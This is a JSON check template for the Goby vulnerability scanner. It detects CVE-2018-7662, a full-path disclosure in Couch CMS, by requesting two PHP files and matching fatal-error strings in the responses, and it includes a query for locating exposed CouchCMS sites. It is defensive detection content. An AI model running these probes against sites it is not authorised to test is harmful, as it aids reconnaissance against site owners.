{
      "Name": "Couch CMS Infoleak CVE-2018-7662",
      "Level": "3",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "(title=\"CouchCMS\" | body=\"Powered by CouchCMS\")",
      "Description": "Couch through 2.0 allows remote attackers to discover the full path via a direct request to includes/mysql2i/mysql2i.func.php or addons/phpmailer/phpmailer.php",
      "Product": "Couch cms",
      "Homepage": "https://www.couchcms.com/",
      "Author": "aetkrad",
      "Impact": "",
      "Recommendation": "",
      "References": [],
      "HasExp": false,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/includes/mysql2i/mysql2i.func.php",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "mysql2i.func.php on line 10",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "Fatal error: Cannot redeclare mysql_affected_rows() in",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody||"
                  ]
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/addons/phpmailer/phpmailer.php",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "phpmailer.php on line 10",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "Fatal error: Call to a menber function add_event_listener() on a non-object in",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody||"
                  ]
            }
      ],
      "PostTime": "2021-11-09 19:56:42",
      "GobyVersion": "1.8.302"
}